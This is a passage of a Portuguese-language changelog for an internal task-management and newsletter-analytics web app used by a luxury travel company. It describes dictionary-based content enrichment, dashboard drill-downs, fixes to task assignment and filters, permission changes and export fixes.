+2. **Footer regulatório de 800-1000c**: contatos, regulamentos,
+   "consulte detalhes" — não tem destino útil mas tem keywords.
+
+Mitigação aplicada em `enrich-mc-claude.cjs`:
+- **Stripa primeiros 200c** (header reusado) + **últimos 800c** (footer)
+- **Descarta docs com htmlText < 1200c** (provavelmente só boilerplate)
+- **Regra dupla de mention**:
+  - Subject + name: **1 match basta** (texto curto, específico)
+  - htmlText: **exige 2+ ocorrências** (header isolado vira ruído)
+
+### Hotéis específicos adicionados
+
+50 → **104 brands** no dicionário. Patina (Maldives/Bali), Aman
+(Tokyo/Venice/Amankora/Amanyara), Soneva (Fushi/Jani/Secret), Cheval
+Blanc (Randheli/Paris/St-Tropez), Bulgari (Maldives), EDITION
+(Maldives/Sanya/NY), Four Seasons (Maldives/Bora Bora/Mauritius),
+Six Senses (vários), St. Regis (Maldives/Bora Bora/Punta Mita),
+Ritz-Carlton (Maldives/Reserve), One&Only (Reethi Rah/Le Saint Géran/
+Mandarina), Capella (Bangkok/Singapore/Sydney/Ubud), Rosewood
+(Mayakoba/Bangkok/Hong Kong), Park Hyatt (Tokyo/Niseko/Mendoza), e trens
+de luxo (La Dolce Vita Orient Express, Belmond Andean Explorer, etc).
+
+### Cobertura final (audit pós v4.49.26)
+
+| BU | Cidades inicial → final | Cobertura cities (% docs) |
+|---|---|---|
+| **Centurion** | 4 → **9** (+125%) | 27/73 (37%) → **39/73 (53%)** |
+| **PTS** | 2 → **10** (+400%) | 17/82 (21%) → **46/82 (56%)** |
+| **Primetour** | 14 → **29** (+107%) | 64/209 (31%) → **93/209 (44%)** |
+| **BTG Ultrablue** | 16 → **18** | 99/240 (41%) → 103/240 (43%) |
+| **BTG Partners** | 16 → **18** | 47/152 (31%) → 51/152 (34%) |
+
+Centurion agora identifica destinos do body: **Itacaré, Cusco, Vale
+Sagrado** (Peru), além de **Maldivas, Nova York, Polinésia Francesa**.
+
+### Auditoria & idempotência
+
+O script registra `extractedBy: 'claude-backfill-v4.49.25'`,
+preserva extracted prévio, e pode ser re-rodado quantas vezes for
+necessário — só adiciona, nunca remove.
+
+---
+
+## [4.49.25+20260519-nl-enrich-claude-backfill] — 2026-05-19
+
+Release **PATCH** — Backfill determinístico do `mc_performance.extracted`
+curado por Claude (sem custo de API). User questionou: "4 cidades para
+Centurion em 1.5 meses? Parece muito abaixo". Audit confirmou.
+
+### Por que não API
+
+User: "vc faz a reclassificação e inputa lá. nada de api". Faz sentido —
+o domínio PRIMETOUR (luxury travel) é conhecido, e dicionário curado +
+matching determinístico é mais barato e auditável que LLM. Usado:
+
+- **148 cidades** com país-mãe + aliases (NY→Nova York, Tokyo→Tóquio,
+  "Cidade do Cabo"→"Cape Town"…)
+- **51 países** com aliases PT/EN/ES
+- **50 marcas** de hotel/cruzeiro premium
+
+### Falsos positivos cortados na fase DRY-RUN
+
+- "**Como**" (hotel) eliminado — colidia com palavra interrogativa PT
+- "**Norman**" eliminado — muito genérico
+- "**la**" alias de Los Angeles — colidia com artigo "La" italiano/espanhol
+- "**sf**", "**sp**", "**rio**" aliases — polissêmicos demais
+
+### Resultado (audit pós-backfill)
+
+| BU | Cidades antes → depois | Países antes → depois |
+|---|---|---|
+| **Centurion** | 4 → **6** (+Maldivas, +Nova York) | 5 → **7** |
+| **PTS** | 2 → **6** (+Maldivas, NY, Cancún, Aspen) | 3 → **6** |
+| **Primetour** | 14 → **22** (+8) | 12 → **19** (+7) |
+| **BTG Ultrablue** | 16 → **17** | 9 → **10** (+Turquia) |
+| **BTG Partners** | 16 → 16 | 23 → 23 |
+
+**129 docs enriquecidos · +58 cidades · +93 países · +31 marcas.**
+
+### Limitação conhecida (Centurion)
+
+Centurion continua com **menos cidades** que outras BUs porque os
+subjects são genuinamente inspiracionais: "Refúgios Exclusivos", "Ilhas
+Privativas", "Sua Próxima Fuga" — não mencionam destino. Pra capturar
+mais seria necessário ler o HTML body do email (escopo futuro).
+
+### Idempotente + auditável
+
+`functions/enrich-mc-claude.cjs` pode rodar quantas vezes quiser. Só
+ADICIONA, nunca remove. Marca `extractedBy: 'claude-backfill-v4.49.25'`
+e bump confidence pra `medium` quando enriquece um doc que era `low`.
+`functions/audit-mc-performance.cjs` para diagnóstico contínuo.
+
+---
+
+## [4.49.24+20260519-nl-content-sort-expand-drill] — 2026-05-19
+
+Release **MINOR** — Quick wins na aba **Conteúdo & Temas** do dashboard
+de Newsletters, baseado em feedback estruturado do user (5 pontos:
+classificação dupla, visualização, drill-down, pipeline e exports).
+Esta release entrega **só os quick wins** (visualização + drill); os
+demais pontos (duplo eixo comercial/turismo, auditoria do pipeline,
+PPT export) entram em releases subsequentes.
+
+### Visualização
+
+- **Sortar colunas** por click no header: Disparos, Abertura, Cliques,
+  Opt-out, e nome da entidade. Setas ▼/▲ indicam direção; click no
+  mesmo col alterna asc/desc. Estado persistido in-memory por bloco
+  (`_contentTableState`) — sobrevive re-renders mas reseta ao navegar
+  fora da aba.
+- **Botão "Ver todos"** abaixo de cada tabela/bars. Antes hard-cap em
+  top 12 (países/cidades/temas) ou top 10 (hotéis/cruises). Agora
+  toggle entre top-N e lista completa, com label dinâmico
+  ("+ Ver todos os 47" ↔ "− Colapsar (top 12)").
+- **Colunas novas:** Cliques (% click rate) e Opt-out (% optout rate)
+  em todas as tabelas/bars. Agregador `aggregateContent` ganhou
+  `totalClick` e `totalOptOut` somando dos docs.
+
+### Drill-down
+
+- **Click em qualquer linha** (.nlc-drill-row) abre **modal com os
+  disparos** que compõem aquele item. Antes:
+  - Países/cidades: virava filtro (UX limitada — perdia contexto)
+  - Hotéis/temas/types: nada acontecia
+- Modal mostra: subject + código, BU, data de envio, enviados,
+  abertura, cliques, opt-out, botão **✎** pra editar classificação
+  manual. **Respeita os filtros aplicados** no dashboard (sends[]
+  vem do agregador filtrado).
+- Aplicável a: países, cidades, hotéis, cruises, temas, marcas,
+  audiências, tipos de newsletter.
+
+### O que vem depois (roadmap)
+
+- **Duplo eixo de classificação** (Comercial + Turismo) com ordem de
+  prioridade documentada — migração via mapping determinístico do
+  `newsletterType` atual (sem custo de API).
+- **Auditoria do pipeline** Centurion (4 cidades em 1.5 meses):
+  script de diagnóstico mostrando docs por BU/período/enriched.
+- **Export PPT** + garantir Excel/PPT respeitam BU/período/
+  classificações/insights filtrados.
+
+---
+
+## [4.49.23+20260519-feedbacks-1x1-vs-sistema] — 2026-05-19
+
+Release **PATCH** — User reportou: "Feedbacks: entrei e atualizei 3x,
+mostrava 1 teste. Acionei via email e veio com todos em Equipes. Tem 2
+feedbacks (sistema vs RH), sistema confunde?". Audit revelou que os 2
+módulos estão arquiteturalmente segregados (coleções diferentes,
+páginas diferentes), mas **UX visual confundia** e havia **race
+condition** no filtro hierárquico que explicava o "só 1 teste".
+
+### 🐛 Race condition — filtro hierárquico de `/feedbacks`
+
+`renderFeedbacks` aplicava filtro restritivo ANTES de `userRole`/
+`userPermissions` estarem carregados. Cascata:
+- `store.isMaster()` retornava false (userRole ainda null)
+- `store.can('system_view_all')` também false (perms vazias)
+- Entrava na branch restritiva com `visibleSet = só self`
+- Resultado: só feedbacks onde o user é collaborator OU manager = 1 entry
+
+Fix em 3 partes:
+1. **Aguarda userRole** carregar (loop polling até 2s · 20 ticks de 100ms)
+2. **Fallback de role**: além de `isMaster()`, checa `userRole.id === 'master'`
+   e `userProfile.roleId === 'master'` (cobre profile carregado mas role obj ainda não)
+3. **Fail-open** se userRole ainda não chegou: NÃO aplica filtro client,
+   confia nas Firestore rules server-side (seguro, é defesa em camada)
+
+### 🎨 Clareza visual — distinção entre os 2 conceitos
+
+Os 2 módulos viviam no sidebar com mesmo ícone (`feedbacks` = balão de chat).
+Diferenciação aplicada:
+
+- **Sidebar**:
+  - `/feedbacks` → label **"Feedbacks 1:1"** (era "Feedbacks") · ícone mantido (balão = conversa entre pessoas)
+  - `/system-feedback` → ícone novo **`system-feedback`** (megafone) · label mantido
+- **Page headers** com cross-link explícito:
+  - `/feedbacks`: "(RH · gestor↔colaborador) · Bugs ou sugestões do app? → Feedbacks do Sistema"
+  - `/system-feedback`: "(Bugs/sugestões do app) · Avaliações 1:1 de pessoas? → Feedbacks 1:1"
+
+### Sem mudança arquitetural
+
+Os 2 módulos seguem com coleções separadas (`feedbacks` vs
+`system_feedback`), perms separadas (`feedback_view/create` vs
+`system_manage_settings`), services e páginas dedicadas. Só UX e
+defesa de carregamento foram tocadas — segurança/dados intactos.
+
+---
+
+## [4.49.22+20260519-exports-skip-vazios] — 2026-05-19
+
+Release **PATCH** — Exports modulares: blocos vazios são ocultados em
+**ambos** os geradores (Portal de Dicas e Roteiros). User reportou:
+"vi um roteiro que carregava um bloco vazio. Se está vazio, precisaria
+ocultar". Mesmo princípio aplicado nas dicas.
+
+### Portal de Dicas (`portalGenerator.js`)
+
+`buildContent()` antes só checava `!data`. Resultado: se um segmento
+estava presente no doc mas com `items=[]` e sem texto descritivo, o
+exporter (PDF / Word / PowerPoint) renderizava o **header** do segmento
+("RESTAURANTES", "ATRAÇÕES"…) seguido de espaço em branco.
+
+Adicionado `segHasContent(segDef, data)` (mesmo critério do
+`segHasContent` do editor v4.49.13+):
+- `place_list`/`agenda`: precisa de items com título OU `themeDesc` OU `periodoAgenda`
+- `simple_list`: items com título OU `themeDesc`
+- `special_info`: qualquer campo de `info` preenchido (descrição,
+  população, moeda, língua, voltagem, clima, representação…)
+
+Aplica nos 3 formatos (DOCX, PDF, PPTX) — usam o mesmo `buildContent`.
+
+### Roteiros (`roteiroGenerator.js`)
+
+3 seções vulneráveis: o título era renderizado ANTES do check de
+conteúdo. Se a verificação interna acabasse com lista vazia, ficava
+título solto.
+
+- **VALORES** (`buildPricingSection`): título saía mesmo se `customRows`
+  tivesse só entries com `label` e sem `value`. Fix: filtra entries
+  exigindo label E value, e retorna early se `rows.length === 0`.
+- **SERVIÇOS OPCIONAIS** (`buildOptionalsSection`): mesma armadilha —
+  optionals podia ter `[{},{}]` (entries totalmente vazias). Fix:
+  filtra antes do título, return early se zerar.
+- **INFORMAÇÕES IMPORTANTES** (`buildImportantInfoSection`):
+  `customFields` com `{label:'', value:''}` zerava sections após o filtro
+  mas o título já tinha saído. Fix: monta sections, return early se vazio.
+
+Outras seções (HOSPEDAGEM, INCLUI/NÃO INCLUI, PAGAMENTO, CANCELAMENTO,
+DIA A DIA, DICAS LOCAIS) já tinham defesa adequada — orchestrator e/ou
+função interna verificavam `.length` antes do título. Documentado no
+audit.
+
+---
+
+## [4.49.21+20260519-metalinks-segue-responsavel] — 2026-05-19
+
+Release **PATCH** — **Bug fix crítico** reportado por user:
+> "quando crio a tarefa, a meta fica vinculada ao meu user, mesmo que eu
+> coloque outras pessoas como responsáveis. Como estou gerenciando a
+> empresa, abro e concluo tarefas, mas a meta tem de estar vinculada ao
+> responsável por ela."
+
+### Diagnóstico
+
+3 causas combinadas no `taskModal.js`:
+
+1. **Auto-assign self em tarefas novas**: `currentAssignees.length === 0`
+   → criador entrava como assignee. Pra analista isso é OK (cria a própria
+   tarefa); pra gestor é errado (cria pra equipe).
+2. **`activeUserId` do picker de metas** = primeiro assignee. Como o criador
+   foi auto-adicionado, o picker abria na aba dele e os links iam pra ele.
+3. **Trocar assignee depois NÃO removia o metaLink órfão** → ficava
+   `metaLinks: [{ userId: <criador>, … }]` mesmo com criador fora dos assignees.
+
+### Fix em 3 camadas
+
+1. **Auto-assign condicional**: só pra role `member` (Analista) e `partner`.
+   Coordinator/Manager/Admin/Master começam o modal com assignees vazio.
+2. **Sync on remove**: quando user remove um chip de responsável no modal,
+   `task.metaLinks` perde TODOS os links daquele userId imediatamente.
+3. **Prune no save**: filtro final no payload garante que cada `metaLinks[i].userId`
+   está em `assignees` (ou é o sentinel `__task__` p/ tarefas sem responsável).
+   Defesa em profundidade — se UI escapar algo, o save corrige.
+
+### Comportamento esperado agora
+
+- Gestor (Renê/Diretoria) abre Nova Tarefa → assignees vazio.
+- Adiciona João como responsável.
+- Picker de meta abre na aba do João → meta vai p/ `userId: João`.
+- Gestor salva → `metaLinks: [{ userId: João, … }]`. ✓
+- No dashboard de João, a meta aparece (não na do Renê).
+
+Default histórico do Analista preservado (auto-assign segue funcionando).
+
+---
+
+## [4.49.20+20260519-presets-atividade-vs-emjogo] — 2026-05-19
+
+Release **MINOR** — User reportou que mesmo com mesmo predicate "sem tipo",
+o filtro `Últimos 30 dias` em #tasks dava 825 enquanto dash dava 129.
+**Causa:** o label "Últimos 30 dias" enganava — o preset NÃO é atividade
+no período. É "abertas + concluídas recentes" (semântica de workflow).
+
+### Reorganização dos presets de prazo em 3 famílias semânticas
+
+O dropdown agora tem `<optgroup>`s claros:
+
+1. **Por prazo (dueDate):** Atrasadas, Hoje, Amanhã, Esta/Próxima semana,
+   Este mês, Sem prazo. → filtra por `t.dueDate`.
+
+2. **Em jogo (workflow):** "Em jogo · 30d (padrão)" e "Em jogo · 90d"
+   (era `last30Days` / `last90Days`). → mantém todas abertas + concluídas
+   no período. Útil pro dia a dia operacional.
+
+3. **Atividade no período (KPI):** `📊 Atividade · 7d`, `· 30d (bate c/ dash)`,
+   `· 90d`. → filtra por `createdAt OR completedAt` dentro do range. **Mesmo
+   critério do `inPeriod()` em #dashboards.** Quem clica num card do dash
+   aterriza com EXATAMENTE a mesma contagem.
+
+### Deep-link do dashboard usa preset nomeado
+
+`dashboards.js`: `periodLinkSuffix` agora envia `&datePreset=activityIn30d`
+(ou 7d/90d) quando o período bate; só usa `from/to` explícito pra `12m`
+ou custom. URL mais curta, conceito mais claro.
+
+### Comportamento histórico preservado
+
+O default segue `last30Days` (renomeado "Em jogo · 30d") — não muda o
+workflow diário de ninguém. Quem quer KPI estilo dashboard agora tem opção
+explícita na própria toolbar.
+
+---
+
+## [4.49.19+20260519-dash-prod-coerencia-fim] — 2026-05-19
+
+Release **PATCH** — Cola de coerência fim a fim entre Dashboard ↔ #tasks.
+
+Versão 4.49.18 trouxe deep-link mas usava `datePreset=last30Days` em #tasks,
+que tem semântica diferente de "ativa no período" do dashboard. Resultado:
+clicava no card "Sem tipo (122)" e #tasks abria com 825 tarefas (porque
+`last30Days` inclui TODAS abertas + done recentes).
+
+- **Novo preset `activityInPeriod`** em `tasks.js`: filtra por
+  `createdAt OR completedAt` dentro do range — mesmo critério do
+  `inPeriod()` em `dashboards.js`.
+- Deep-link agora envia `?type=…&datePreset=activityInPeriod&from=<ymd>&to=<ymd>`
+  com o range exato do período ativo do dashboard.
+- URL params `from` / `to` agora reconhecidos no boot do `tasks.js`.
+
+Agora a contagem do card e da lista batem precisamente.
+
+---
+
+## [4.49.18+20260519-dash-prod-coerencia] — 2026-05-19
+
+Release **PATCH** — Coerência entre Dashboard de Produtividade e a página de
+Tarefas. User reportou divergência ("122 sem tipo no dash vs 828 sem tipo
+em #tasks") + usuários pending aparecendo no ranking da equipe.
+
+### 🐛 Bug fix — Sem tipo desalinhado
+
+`analytics.js getProductivityByType` usava `t.typeId || '__none__'`,
+ignorando o campo legacy `t.type` (string). Resultado: tarefas com
+`t.type='newsletter'` mas sem typeId caíam no bucket "Sem tipo",
+inflando essa contagem.
+
+- Agora usa `t.typeId || t.type || '__none__'` — **mesmo critério** do
+  `getTimePerTaskByType` e do filtro `__NONE__` em `tasks.js`
+  (`!t.typeId && !t.type`).
+- Tarefas com legacy type voltam pro bucket correto (Newsletter, etc.).
+
+### 🐛 Bug fix — Pending users no ranking equipe
+
+`getTasksByMember` listava todo uid presente em `t.assignees[]`, incluindo
+usuários `pendingSso: true` (pré-cadastrados sem primeiro login SSO) e
+`active: false` (desativados). Poluía o ranking com nomes irrelevantes.
+
+- Agora filtra por padrão. Aceita opção `{ includeOrphans: true }` se
+  alguma view futura quiser exibir (ex: auditoria de orphan assignments).
+- Cada entry ganha flags `_isPending` / `_isInactive` / `_isOrphan`.
+
+### 🔗 Drill-down do dashboard → #tasks
+
+Tornado clicáveis os 2 rankings (equipe + tipo). Cada item vira
+deep-link pra `#tasks` com filtros e período pré-aplicados, garantindo
+**a mesma contagem** que aparece no card:
+
+- `tasks.js` agora lê `?type=<id|__NONE__>` e `?datePreset=<preset>` da URL.
+- Dashboard mapeia o período ativo (`7d/30d/90d/12m`) pro preset
+  equivalente em `#tasks` (`last7Days/last30Days/last90Days/<vazio>`).
+- `renderLeaderboard` aceita `href` opcional por item e envelopa em `<a>`.
+
+Agora user clica em "Sem tipo · 122" no dash, abre `#tasks?type=__NONE__&datePreset=last30Days`,
+e vê exatamente 122 tarefas — sem mistério.
+
+---
+
+## [4.49.17+20260519-calendar-up-filters-type] — 2026-05-19
+
+Release **MINOR** — Duas mudanças baseadas em feedback direto do user:
+
+### 📅 Meu Painel — Meu Calendário reorganizado
+
+- **Calendário sobe pro topo da coluna esquerda** (era abaixo de Minhas Tarefas).
+- **Mini-mês sempre aberto** (era colapsável). Toggle removido — agenda
+  e visão mensal ficam visíveis ao mesmo tempo.
+- **Tooltip nas células do mês**: passar o mouse mostra os títulos das
+  tarefas daquele dia (até 5 com horário; >5 vira "+N mais"). User não
+  precisa mais clicar pra saber o que tem no dia.
+
+### 🔍 Filtros harmonizados (tasks · steps · calendar · timeline)
+
+User identificou que só Steps tinha filtro por tipo de tarefa e nenhum
+tinha opção "sem tipo". Harmonização nas 4 páginas:
+
+- **Filtro "Sem tipo"** (sentinel `__NONE__`) em todas: lista tarefas
+  com `typeId` vazio E `type` legacy vazio. Útil pra cleanup/auditoria.
+- **`tasks.js` agora tem filtro por tipo** (estava ausente):
+  - Picker com busca, mesmo padrão dos outros filtros (status, prioridade…)
+  - "∅ Sem tipo" sempre no topo da lista
+  - Visível por padrão (toggle no ⚙ Configurar filtros)
+  - Valor persistido em `tasks.filterValues.v1` junto com os outros
+- **`filterBar.js`** (usado por kanban/calendar/timeline): typeOpts
+  agora inclui sentinel; `buildFilterFn` trata o caso.
+- **Sem regressão**: lookup `taskTypes` continua via `store.get()`,
+  filterVisibility já existente preserva preferências do user.
+
+---
+
+## [4.49.16+20260519-meu-calendario-agenda] — 2026-05-19
+
+Release **PATCH** — Reformulação do **Meu Calendário** (v4.49.15) com base
+em feedback: "só dots não diz o que eu tenho que fazer". Agora o card mostra
+primeiro uma **agenda acionável** com título de cada tarefa.
+
+- **Em atraso** (se houver): seção no topo com borda vermelha, lista as
+  tarefas vencidas não-concluídas (top 5 + link "+N atrasadas →").
+- **Hoje · Amanhã · próximos 14 dias**: agrupado por dia, com header
+  "Hoje" em dourado, "Amanhã" em destaque, dias da semana por extenso
+  até 7d, depois "Seg, 02/06". Cada tarefa mostra horário (se houver),
+  título, status (pill) e cor da borda esquerda por status.
+- **Click na tarefa** abre o taskModal padrão (mesmo fluxo de Minhas Tarefas).
+- **Resumo no header**: "3 hoje · 1 em atraso · 5 próximos" pra glance.
+- **Mini-mês colapsado** por padrão (era o principal antes). Agora fica
+  como toggle "Visão do mês — Maio 2026 ▸" — abre quando o user quiser
+  ver o panorama mensal. Lazy render: só renderiza se expandir.
+- Empty state honesto: "Sem tarefas com data marcada nos próximos 14 dias.
+  Tarefas com data de vencimento aparecem aqui."
+
+---
+
+## [4.49.15+20260519-meu-calendario-dashboard] — 2026-05-19
+
+Release **MINOR** — Bloco **📅 Meu Calendário** no Meu Painel: mini-mês 6×7
+abaixo de "Minhas Tarefas" mostrando as tarefas do user ancoradas em `dueDate`.
+
+- Layout: coluna esquerda virou flex vertical (Minhas Tarefas + Meu Calendário),
+  coluna direita inalterada. Preenche o espaço em branco que sobrava abaixo de
+  Minhas Tarefas sem reformatar a grid.
+- Cada célula do mês mostra o número do dia + até 3 dots coloridos por status
+  (azul/laranja/roxo/verde…); se a tarefa do dia for >3, mostra "+N".
+- Click no dia abre detalhe inline com a lista completa daquele dia; click
+  numa tarefa abre o taskModal padrão.
+- Nav: ◀ mês anterior · Hoje · ▶ próximo mês · "Agenda completa →" pra `#calendar`.
+- Legenda compacta dos 5 status (a fazer/em andamento/revisão/retrabalho/concluída).
+- 100% client-side (reusa `myTasks` já fetched pelo render principal — zero
+  query extra, render O(42) células).
+
+---
+
+## [4.49.14+20260519-analista-portal-dashboard] — 2026-05-19
+
+Release **PATCH** — Liberado `dashboard_portal_view` pro Analista.
+Faz sentido com a operação real: o consultor que produz dicas precisa
+ver top destinos, links ativos e geração agregada do Portal pra orientar
+o próprio trabalho. Demais dashboards executivos (produtividade, roteiros,
+csat) seguem restritos a coord+. Migração: `functions/align-analista-portal-dashboard.cjs`.
+
+---
+
+## [4.49.13+20260519-portal-tips-fixes] — 2026-05-19
+
+Release **PATCH** — Pacote de fixes no Portal de Dicas (relatados em uso real):
+
+- **Bug 1 — Categorias inacessíveis**: criação/edição de categorias só aparecia
+  dentro do dropdown de um item já cadastrado. Adicionado botão **🏷 Categorias**
+  no header de cada painel (place_list e agenda) que abre um modal dedicado
+  de gerenciamento de categorias (`openCategoriesModal`).
+- **Bug 2 — Segmentos só com texto descartados**: `segHasContent` agora também
+  considera `themeDesc` (Bairros/Arredores) e `periodoAgenda` (Agenda Cultural)
+  como conteúdo válido, evitando que segmentos puramente textuais sumam ao salvar.
+- **Bug 3 — Import PDF erro silencioso**: parser agora exibe mensagem clara
+  quando o nome do arquivo não está no formato esperado
+  (`Continente - País - Cidade.pdf`). Aviso destacado na UI de upload.
+- **Feature 4 — Observações internas**: campo `internalNotes` na dica para
+  contexto interno do time (ex.: "RESTAURANTE BOM PARA CASAIS"). Será usado
+  como contexto pela IA no futuro.
+- **Feature 5 — Import via DOCX**: agora aceita `.docx` no upload de dicas,
+  reaproveitando o mesmo pipeline do PDF (mammoth.js carregado on-demand).
+
+---
+
+## [4.49.8+20260518-roles-reorg-office] — 2026-05-18
+
+Release **PATCH** — Reorganização do catálogo RBAC: `office_view` movido de
+"Portal de Dicas" pro grupo renomeado "Equipe, Ausências e Presença".
+Coordenador agora tem `office_view` explícito (estava `undefined`).
+
+---
+
+## [4.49.7+20260518-destinations-bulk-import] — 2026-05-18
+
+Release **MINOR** — Bulk import de destinos via Excel (`.xlsx/.xls/.csv`)
+no Portal de Dicas. Novo componente `destinationsImport.js`: wizard
+com preview tabular (✓ novo / ⚠ duplicado / ✗ erro), dedup automático
+via slug, download de template Excel modelo, tolerância a aliases de coluna.
+Gated por `canManageDestinations()` — Analista também pode importar.
+
+---
+
+## [4.49.6+20260518-segments-categories-perm] — 2026-05-18
+
+Release **PATCH** — Nova perm `portal_segments_manage` liberada pro Analista
+(mesmo padrão de destinos). Wire em `portal.js` (saveCategories,
+saveCustomSegment, deleteCustomSegment) + `portalTipEditor.js` (botão
+"+ Novo segmento"). Propagada nos 6 roles em prod via `updateDoc`.
+
+---
+
+## [4.49.5+20260518-content-calendar-type-filter] — 2026-05-18
+
+Release **PATCH** — Calendário de Conteúdo: slots reais (do banco)
+agora respeitam filtro de tipo via task vinculada. 3 slots fantasma
+("Dia Nacional", "Dia dos Namorados", "Notícia") sumiam quando filtro
+estava ativo. `slotsForDate` + `renderListView` checam
+`visibleTaskTypes` via `_linkedTasks.get(slot.taskId).typeId`.
+
+---
+
+## [4.49.4+20260518-calendar-slot-filter-fix] — 2026-05-18
+
+Release **PATCH** — Calendar: slots virtuais respeitam filtro de tipo
+do toolbar. `getSlotsForDate(date, {typeId, sector})` recebe filtros
+em modo standard (não só pipeline). `renderDay` aplica `buildFilterFn`.
+Validado live: 300→55 cards (-82%) com filtro Newsletter.
+
+---
+
+## [4.49.3+20260518-filters-show-all-types-projects] — 2026-05-18
+
+Release **PATCH** — Filtros mostram TODOS os tipos e projetos. Removido
+filtro sector que escondia tipos no dropdown (timeline/kanban/calendar).
+Calendar usa `fetchProjects` local. `fetchProjects({allWorkspaces:true})`
+em 4 páginas pra mostrar projetos cross-squad. Listing continua filtrado
+por escopo do user.
+
+---
+
+## [4.49.2+20260518-roles-audit-destinos-perm] — 2026-05-18
+
+Release **MINOR** — Auditoria completa do catálogo RBAC + nova perm
+`portal_destinations_manage` (granular, liberada pro Analista). Wire de
+permissions órfãs: `portal_areas_view/manage`, `requests_manage`,
+`ai_skills_manage`, `ai_dashboard_view`. 3 novos helpers em store.js.
+
+---
+
+## [4.49.1+20260518-notif-deeplinks] — 2026-05-18
+
+Release **MINOR** — Notificações clicáveis com deep-link. Helper
+`deriveRouteForEntity(entityType, entityId)` deriva rota fundo: task
+→ abre modal, project → abre detalhe, goal → abre form. Suporte a 12
+entityTypes. URL params limpos via `history.replaceState`.
+
+---
+
+## [4.49.0+20260518-sprint7-tasks-filters-slots-dedup] — 2026-05-18
+
+Release **MAJOR de patch** — Sprint denso com 6 frentes:
+
+- **Item 6 (CRÍTICO)**: duplicação user SSO — firestore rule self-delete
+  pending_* por email match + cleanup retroativo em todo login (`auth.js`).
+  5 docs (Bruno, Letícia, João, Thaís, Beatriz) limpos em prod.
+- **Item 1**: coluna Tipo/Etapa vazia — lookup via `pageTaskTypes`.
+- **Item 3**: tipos sumindo no modal — removido filtro `workspaceId` em
+  `fetchTaskTypes` (8 tipos voltam).
+- **Item 2**: busca no filtro de Projetos em tasks.js (`bindOptionPicker`).
+- **Item 4**: persistência de filtros em `localStorage` por página
+  (tarefas/steps/calendario/timeline).
+- **Item 5**: Slots → Produtividade — campo `fromSlot:{typeId,slotId,date}`
+  + widget "◌ Conversão de Slots" no dashboard.
+
+---
+
+## [4.48.3+20260518-cache-loop-prevention] — 2026-05-18
+
+Release **PATCH** — Prevenção definitiva de loop pós-deploy.
+`<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">`
+em index.html + auto-reload version detector em preload.js. Browser
+sempre busca index.html fresh; se versão mudou recentemente, força
+`location.reload(true)` UMA vez pra purgar módulos cacheados.
+
+---
+
+## [4.48.2+20260518-dynamic-import-portalAreas] — 2026-05-18
+
+Release **PATCH** — `portalAreas.js` convertido pra dynamic import.
+Cascata de static imports quebrava boot quando o módulo cache stale
+falhava. Dynamic import isola a falha — `initAuthObserver` continua
+mesmo se portalAreas não carregar.
+
+---
+
+## [4.48.1+20260518-jsdoc-fix] — 2026-05-18
+
+Release **PATCH** — Fix crítico de parsing em `js/services/areaTokens.js`.
+Comentário `/* */` dentro de `/** */` gerava `SyntaxError` e travava o
+boot inteiro. Substituído por texto sem delimitadores.
+
+---
+
 ## [4.40.28+20260518-dev-hours-products-tab] — 2026-05-18
 
 Release **MINOR** — Sub-dashboard executivo de horas em "Foco em produto"
